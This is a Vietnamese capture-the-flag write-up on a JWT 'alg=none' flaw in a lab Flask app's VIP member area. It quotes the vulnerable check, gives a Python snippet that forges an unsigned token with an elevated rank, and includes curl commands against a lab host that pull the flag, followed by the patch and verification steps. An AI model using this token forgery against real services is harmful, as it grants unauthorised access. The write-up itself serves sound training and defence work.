# 04 · JWT `alg=none` — Ưu đãi hội viên C-Nocturne

| | |
|---|---|
| **Khu vực** | Khu hội viên · `GET /member/benefits`, `GET /member/offers/<id>` |
| **Cần đăng nhập** | Có |
| **Flag nằm ở** | `vip_offers.code` (hiện ở `/member/offers/<id>`) |
| **Script** | [`exploits/jwt.py`](exploits/jwt.py) |

## 1. Nhận dạng (black-box)

- Sau khi đăng nhập, server đặt cookie `meko_member` là một **JWT** 3 phần
  `header.payload.signature` (base64url). Giải phần payload thấy `{"sub": ..., "rank": "basic", "exp": ...}`.
- Khu `/member/benefits` chỉ cho hạng `c-nocturne`; tài khoản thường bị **403**.
- Nghi vấn: hạng hội viên đọc từ **cookie do client giữ** ⇒ nếu server chấp nhận token không
  chữ ký (`alg=none`) thì có thể **tự nâng hạng**.

## 2. Phân tích mã nguồn

[`sandbox/app/app.py`](../sandbox/app/app.py) · hàm `is_vip` (≈ dòng 471–489):

```python
token = request.cookies.get("meko_member", "")
head, body, sig = token.split(".")
header = json.loads(base64.urlsafe_b64decode(head + "=" * (-len(head) % 4)))
claims = json.loads(base64.urlsafe_b64decode(body + "=" * (-len(body) % 4)))
signing = head + "." + body
expected = b64(hmac.digest(state["jwt_secret"].encode(), signing.encode(), "sha256"))
valid = ((header.get("alg") == "none" and sig == "" and not patched("jwt"))   # <-- chấp nhận alg=none
         or (header.get("alg") == "HS256" and hmac.compare_digest(expected, sig)))
if valid and claims.get("exp", 0) > time.time() and claims.get("sub") == str(session["uid"]):
    member = claims
return member.get("rank") in (VIP_RANK, VIP_RANK + "-plus")      # VIP_RANK = "c-nocturne"
```

- Chưa vá: token `alg=none` với chữ ký rỗng được coi là **hợp lệ** ⇒ ta tự rèn claims.
- Ràng buộc: `claims["sub"]` phải bằng `session["uid"]` (id tài khoản đang đăng nhập). Nên ta
  phải dùng đúng id của **chính mình** — lấy từ `sub` trong cookie `meko_member` hiện có (giải
  base64url payload). `exp` phải ở tương lai.
- Đặt `rank = "c-nocturne"` ⇒ `is_vip()` trả True ⇒ vào được khu hội viên, đọc `vip_offers.code`
  (flag) ở `/member/offers/<id>`.

## 3. Khai thác thủ công

```bash
# Giả sử đã đăng nhập (cookie trong jar.txt). Lấy sub từ payload cookie meko_member:
#   phần giữa của token = payload, giải base64url -> {"sub":"123",...}

# Rèn token alg=none (chữ ký rỗng), sub = id của mình, rank = c-nocturne:
python3 - <<'PY'
import base64, json, time
b=lambda x: base64.urlsafe_b64encode(x).decode().rstrip("=")
sub="123"   # <-- thay bằng sub của bạn
head=b(b'{"alg":"none","typ":"JWT"}')
body=b(json.dumps({"sub":sub,"rank":"c-nocturne","exp":int(time.time())+3600}).encode())
print(head+"."+body+".")   # chú ý dấu chấm cuối: chữ ký rỗng
PY

# Dùng token rèn thay cho cookie meko_member (GIỮ cookie session Flask):
curl -s -b jar.txt --cookie "meko_member=<TOKEN_REN>" \
  "http://10.90.0.12/member/benefits" | grep -oE '/member/offers/[0-9]+'
curl -s -b jar.txt --cookie "meko_member=<TOKEN_REN>" \
  "http://10.90.0.12/member/offers/<id>" | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```

> Lưu ý: phải giữ **cookie phiên Flask** (từ đăng nhập) song song với token `meko_member` rèn,
> vì `is_vip` so `sub` với `session["uid"]` và các route `/member/*` có `@user_required`.

## 4. Script tự động

[`exploits/jwt.py`](exploits/jwt.py) tự: đăng ký + đăng nhập → đọc `sub` từ cookie → rèn token
`alg=none` (`rank=c-nocturne`) → ghi đè `meko_member` trong jar (vẫn giữ cookie session) →
liệt kê `/member/offers/<id>` → lấy flag.

```bash
python jwt.py http://10.90.0.12
```

## 5. Bản vá

Bật khóa `jwt`:

```json
{"jwt": true}
```

Khi vá, điều kiện `... and not patched("jwt")` làm nhánh `alg=none` **luôn False**; chỉ còn
chấp nhận `HS256` với chữ ký HMAC hợp lệ (mà `jwt_secret` thì bí mật). Token rèn bị từ chối ⇒
`is_vip()` False ⇒ `/member/*` trả 403. (Chi tiết: [PATCHES.md](PATCHES.md).)

**Tự kiểm chứng sau vá:**
- Hội viên được nhân viên cấp hạng `c-nocturne` (token HS256 thật) vẫn vào khu hội viên bình thường.
- Token `alg=none` rèn ⇒ **403**; script `jwt.py` trả **0 flag**.
- Checker JWT vẫn UP (nó cấp hạng qua `/staff/vip/members` rồi đăng nhập lại để lấy token HS256 hợp lệ).
